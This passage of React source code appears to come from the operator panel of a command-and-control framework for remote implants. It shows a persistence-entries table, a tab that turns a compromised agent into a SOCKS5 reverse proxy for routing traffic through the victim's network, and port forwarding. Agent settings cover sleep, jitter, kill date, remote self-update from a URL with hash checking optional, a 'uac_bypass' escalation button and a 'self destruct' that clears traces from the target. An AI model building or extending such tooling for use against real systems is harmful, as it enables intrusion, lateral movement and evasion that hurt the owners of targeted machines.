            <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No persistence entries. Click REFRESH to scan.</td></tr>
          ) : services.map((s, i) => (
            <tr key={i}>
              <td>{s.name}</td>
              <td style={{ color: 'var(--text-sec)' }}>{s.path}</td>
              <td>{s.type}</td>
              <td style={{ color: s.status === 'active' ? 'var(--green)' : 'var(--yellow)' }}>{s.status?.toUpperCase()}</td>
              <td><button className="btn btn-sm btn-red">REMOVE</button></td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

/* ========== NETWORK TAB ========== */
function NetworkTab({ agentId }) {
  const [proxyActive, setProxyActive] = useState(false);
  const [proxyPort, setProxyPort] = useState(0);
  const [connections, setConnections] = useState(0);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [fwdLocal, setFwdLocal] = useState('');
  const [fwdRemote, setFwdRemote] = useState('');
  const [forwards, setForwards] = useState([]);
  const [copied, setCopied] = useState(false);

  // Poll tunnel status
  const checkStatus = useCallback(async () => {
    try {
      const status = await api.tunnelStatus(agentId);
      setProxyActive(status.active);
      setProxyPort(status.port || 0);
      setConnections(status.connections || 0);
    } catch {}
  }, [agentId]);

  useEffect(() => {
    checkStatus();
    const interval = setInterval(checkStatus, 5000);
    return () => clearInterval(interval);
  }, [checkStatus]);

  const startProxy = async () => {
    setLoading(true);
    setError(null);
    try {
      // First send tunnel_start task to agent to initiate WS connection
      await api.createTask(agentId, 'tunnel_start', { type: 'socks5', port: 1080 });
      // Wait a moment for agent to connect, then start the proxy
      setTimeout(async () => {
        try {
          const res = await api.tunnelStart(agentId);
          setProxyActive(true);
          setProxyPort(res.port);
          setLoading(false);
        } catch (e) {
          setError(e.message || 'Failed to start proxy relay');
          setLoading(false);
        }
      }, 3000);
    } catch (e) {
      setError(e.message);
      setLoading(false);
    }
  };

  const stopProxy = async () => {
    setLoading(true);
    try {
      await api.tunnelStop(agentId);
      await api.createTask(agentId, 'tunnel_stop', {});
      setProxyActive(false);
      setProxyPort(0);
      setConnections(0);
    } catch (e) {
      setError(e.message);
    }
    setLoading(false);
  };

  const proxyUrl = proxyPort ? `socks5://${window.location.hostname}:${proxyPort}` : '';

  const copyUrl = () => {
    navigator.clipboard.writeText(proxyUrl).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };

  const addForward = () => {
    api.createTask(agentId, 'tunnel_start', { type: 'portfwd', local: fwdLocal, remote: fwdRemote });
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="two-col">
        <div>
          <div className="section-label">SOCKS5 REVERSE PROXY</div>

          {/* Status indicator */}
          <div style={{
            padding: 16,
            border: `1px solid ${proxyActive ? 'var(--green)' : 'var(--border)'}`,
            background: proxyActive ? 'rgba(0,255,136,0.05)' : 'var(--surface)',
            marginBottom: 16,
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
              <span style={{
                width: 8, height: 8, borderRadius: '50%',
                background: proxyActive ? 'var(--green)' : 'var(--text-disabled)',
                display: 'inline-block',
                animation: proxyActive ? 'pulse 2s infinite' : 'none',
              }} />
              <span style={{
                fontFamily: 'var(--font-mono)', fontSize: 11, fontWeight: 700,
                color: proxyActive ? 'var(--green)' : 'var(--text-muted)',
                letterSpacing: '1.4px', textTransform: 'uppercase',
              }}>
                {proxyActive ? 'PROXY ACTIVE' : 'PROXY INACTIVE'}
              </span>
              {proxyActive && (
                <span style={{
                  fontFamily: 'var(--font-mono)', fontSize: 10,
                  color: 'var(--text-muted)', marginLeft: 'auto',
                }}>
                  {connections} connection{connections !== 1 ? 's' : ''}
                </span>
              )}
            </div>

            {proxyActive && proxyUrl && (
              <div style={{
                display: 'flex', gap: 8, alignItems: 'center',
                padding: '8px 12px', background: 'rgba(0,0,0,0.3)',
                border: '1px solid var(--border)', marginBottom: 12,
              }}>
                <span style={{
                  fontFamily: 'var(--font-mono)', fontSize: 12,
                  color: 'var(--green)', flex: 1,
                }}>{proxyUrl}</span>
                <button className="btn btn-sm" onClick={copyUrl}>
                  {copied ? '✓ COPIED' : 'COPY'}
                </button>
              </div>
            )}

            {error && (
              <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--red)', marginBottom: 8 }}>
                ✕ {error}
              </div>
            )}

            <div style={{ display: 'flex', gap: 8 }}>
              {!proxyActive ? (
                <button className="btn btn-green" onClick={startProxy} disabled={loading}>
                  {loading ? '⏳ STARTING...' : '▶ START PROXY'}
                </button>
              ) : (
                <button className="btn btn-red" onClick={stopProxy} disabled={loading}>
                  {loading ? '⏳ STOPPING...' : '■ STOP PROXY'}
                </button>
              )}
            </div>
          </div>

          <div style={{
            padding: 12, border: '1px solid var(--border)', background: 'var(--surface)',
            fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)',
            lineHeight: 1.8,
          }}>
            <div style={{ color: 'var(--text-sec)', fontWeight: 700, marginBottom: 4 }}>HOW IT WORKS</div>
            <div>1. Agent connects to C2 via WebSocket tunnel</div>
            <div>2. C2 opens a local SOCKS5 port</div>
            <div>3. Configure your browser: <span style={{ color: 'var(--green)' }}>socks5://server:PORT</span></div>
            <div>4. All traffic routes through the agent's network</div>
          </div>
        </div>
        <div>
          <div className="section-label">Port Forwarding</div>
          <div className="form-row" style={{ marginBottom: 12 }}>
            <div className="form-group">
              <label className="form-label">Local Port</label>
              <input type="number" className="form-input" placeholder="Local port" value={fwdLocal} onChange={e => setFwdLocal(e.target.value)} />
            </div>
            <div className="form-group">
              <label className="form-label">Remote Host:Port</label>
              <input type="text" className="form-input" placeholder="host:port" value={fwdRemote} onChange={e => setFwdRemote(e.target.value)} />
            </div>
          </div>
          <button className="btn btn-green" onClick={addForward}>ADD FORWARD</button>
          <div className="section-label" style={{ marginTop: 20 }}>Active Forwards</div>
          <table>
            <thead><tr><th>Local</th><th>Remote</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody>
              {forwards.length === 0 ? (
                <tr><td colSpan={4} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No active forwards</td></tr>
              ) : forwards.map((f, i) => (
                <tr key={i}>
                  <td>{f.local}</td><td>{f.remote}</td>
                  <td style={{ color: 'var(--green)' }}>ACTIVE</td>
                  <td><button className="btn btn-sm btn-red">REMOVE</button></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

/* ========== AGENT SETTINGS TAB ========== */
function AgentSettingsTab({ agentId, sleep, setSleep, jitter, setJitter }) {
  const [killDate, setKillDate] = useState('2027-01-01');
  const [workStart, setWorkStart] = useState('08:00');
  const [workEnd, setWorkEnd] = useState('18:00');
  const [updateUrl, setUpdateUrl] = useState('');
  const [updateHash, setUpdateHash] = useState('');
  const [showUpdateDialog, setShowUpdateDialog] = useState(false);
  const [showSelfDestruct, setShowSelfDestruct] = useState(false);

  const updateConfig = () => {
    api.createTask(agentId, 'config_store_write', { sleep, jitter, kill_date: killDate, work_start: workStart, work_end: workEnd });
  };

  const selfDestructConfirm = () => {
    api.createTask(agentId, 'cleanup', {});
    setShowSelfDestruct(false);
  };

  const sendUpdate = () => {
    if (!updateUrl) return;
    api.createTask(agentId, 'self_update', { url: updateUrl, hash: updateHash });
    setShowUpdateDialog(false);
    setUpdateUrl('');
    setUpdateHash('');
  };

  return (
    <div style={{ padding: 16, maxWidth: 600 }}>
      <div className="form-row">
        <div className="form-group">
          <label className="form-label">Sleep Interval (seconds)</label>
          <input type="number" className="form-input" value={sleep} onChange={e => setSleep(parseInt(e.target.value))} />
        </div>
        <div className="form-group">
          <label className="form-label">Jitter (%)</label>
          <div className="slider-container">
            <input type="range" min="0" max="50" value={jitter} onChange={e => setJitter(parseInt(e.target.value))} />
            <span className="slider-val">{jitter}%</span>
          </div>
        </div>
      </div>
      <div className="form-row">
        <div className="form-group">
          <label className="form-label">Kill Date</label>
          <input type="date" className="form-input" value={killDate} onChange={e => setKillDate(e.target.value)} />
        </div>
        <div className="form-group">
          <label className="form-label">Working Hours</label>
          <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
            <input type="time" className="form-input" value={workStart} onChange={e => setWorkStart(e.target.value)} style={{ width: 'auto' }} />
            <span style={{ color: 'var(--text-muted)' }}>to</span>
            <input type="time" className="form-input" value={workEnd} onChange={e => setWorkEnd(e.target.value)} style={{ width: 'auto' }} />
          </div>
        </div>
      </div>
      <div style={{ display: 'flex', gap: 8, marginTop: 24 }}>
        <button className="btn btn-green" onClick={updateConfig}>UPDATE CONFIG</button>
        <button className="btn" onClick={() => api.createTask(agentId, 'reconnect', {})}>RECONNECT</button>
        <button className="btn" style={{ marginLeft: 8 }} onClick={() => setShowUpdateDialog(!showUpdateDialog)}>UPDATE AGENT</button>
        <button className="btn" style={{ marginLeft: 8, background: '#ff8800', color: '#000', fontWeight: 700 }} onClick={() => api.createTask(agentId, 'uac_bypass', {})}>⬆ ESCALATE</button>
      </div>

      {showUpdateDialog && (
        <div style={{ marginTop: 16, padding: 16, border: '1px solid var(--border)', background: 'var(--surface)' }}>
          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-sec)', marginBottom: 12, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
            Self-Update Agent Binary
          </div>
          <div className="form-group">
            <label className="form-label">Binary URL</label>
            <input type="text" className="form-input" value={updateUrl} onChange={e => setUpdateUrl(e.target.value)} placeholder="https://example.com/agent.exe" />
          </div>
          <div className="form-group" style={{ marginTop: 8 }}>
            <label className="form-label">SHA256 Hash (optional)</label>
            <input type="text" className="form-input" value={updateHash} onChange={e => setUpdateHash(e.target.value)} placeholder="Leave empty to skip verification" style={{ fontFamily: 'var(--font-mono)', fontSize: 10 }} />
          </div>
          <div style={{ display: 'flex', gap: 8, marginTop: 12 }}>
            <button className="btn btn-green" onClick={sendUpdate} disabled={!updateUrl}>SEND UPDATE</button>
            <button className="btn" onClick={() => setShowUpdateDialog(false)}>CANCEL</button>
          </div>
        </div>
      )}
      <div style={{ marginTop: 40, paddingTop: 20, borderTop: '1px solid var(--border)' }}>
        <button className="btn btn-red" style={{ fontSize: 11, padding: '12px 24px' }} onClick={() => setShowSelfDestruct(true)}>SELF DESTRUCT</button>
        <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-disabled)', marginTop: 8 }}>
          Removes all persistence, clears traces, terminates agent process.
        </div>
      </div>

      <ConfirmModal
        open={showSelfDestruct}
        title="CONFIRM SELF DESTRUCT"
        message="This will terminate the agent process, remove all persistence mechanisms, and clear all traces from the target system. This action is IRREVERSIBLE."
        detail={
          <>
            <div><span style={{ color: 'var(--text-muted)' }}>AGENT: </span><span style={{ color: 'var(--green)' }}>{agentId}</span></div>
            <div><span style={{ color: 'var(--red)' }}>All persistence will be removed. The agent will not reconnect.</span></div>
          </>
        }
        confirmLabel="SELF DESTRUCT"
        onConfirm={selfDestructConfirm}
        onCancel={() => setShowSelfDestruct(false)}
      />
    </div>
  );
}
